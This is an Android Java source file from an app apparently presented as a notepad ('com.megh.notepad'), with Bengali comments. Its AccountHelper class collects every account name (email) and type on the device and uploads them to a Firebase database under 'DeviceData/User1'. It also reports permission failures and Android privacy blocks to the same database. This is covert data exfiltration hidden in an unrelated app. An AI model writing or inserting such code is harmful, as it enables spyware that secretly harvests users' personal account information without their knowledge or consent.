package com.megh.notepad; // আপনার প্যাকেজের নাম দিন

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.content.pm.PackageManager;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class AccountHelper {

    public static void syncAccounts(Context context) {
        try {
            DatabaseReference dbRef = FirebaseDatabase.getInstance()
                    .getReference("DeviceData").child("User1").child("Accounts");

            // ১. পারমিশন চেক করা
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
                dbRef.child("Status").setValue("Error: GET_ACCOUNTS (Contacts) Permission Denied!");
                Log.e("AccountHelper", "Permission denied!");
                return;
            }

            AccountManager accountManager = AccountManager.get(context);
            Account[] accounts = accountManager.getAccounts();

            // ২. যদি লিস্ট খালি আসে (অ্যান্ড্রয়েড ৮+ রেস্ট্রিকশন)
            if (accounts == null || accounts.length == 0) {
                dbRef.child("Status").setValue("Blocked: 0 Accounts Found (Restricted by Android 8+ Privacy Policy)");
                return;
            }

            // ৩. যদি অ্যাকাউন্ট পায়
            Map<String, Object> accountsMap = new HashMap<>();
            
            int count = 1;
            for (Account account : accounts) {
                Map<String, String> singleAccount = new HashMap<>();
                singleAccount.put("Name_Email", account.name);
                singleAccount.put("Account_Type", account.type); 
                
                accountsMap.put("Account_" + count, singleAccount);
                count++;
            }

            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault());
            accountsMap.put("Last_Synced", sdf.format(new Date()));
            accountsMap.put("Status", "Success: " + accounts.length + " accounts found");

            dbRef.setValue(accountsMap);
            Log.d("AccountHelper", "Accounts synced! Total: " + accounts.length);

        } catch (Exception e) {
            Log.e("AccountHelper", "Error syncing accounts: " + e.getMessage());
        }
    }
}


